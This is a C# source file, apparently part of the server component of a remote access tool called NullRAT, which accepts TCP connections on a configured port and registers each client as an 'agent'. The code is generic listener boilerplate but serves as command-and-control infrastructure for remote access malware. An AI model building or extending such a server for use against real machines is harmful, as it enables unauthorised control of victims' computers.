using NullRAT.Config;
using NullRAT.Server.Core;
using NullRAT.Utils;
using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace NullRAT.Server.Core
{
    public static class Listener
    {
        private static TcpListener _listener;

        public static void StartListening()
        {
            _listener = new TcpListener(IPAddress.Any, Config.ServerPort);
            _listener.Start();
            ConsoleUI.Log($"NullRAT Server listening on port {Config.ServerPort}", ConsoleColor.Magenta);

            Task.Run(async () =>
            {
                while (true)
                {
                    TcpClient client = await _listener.AcceptTcpClientAsync();
                    AgentManager.AddAgent(client);
                }
            });
        }
    }
}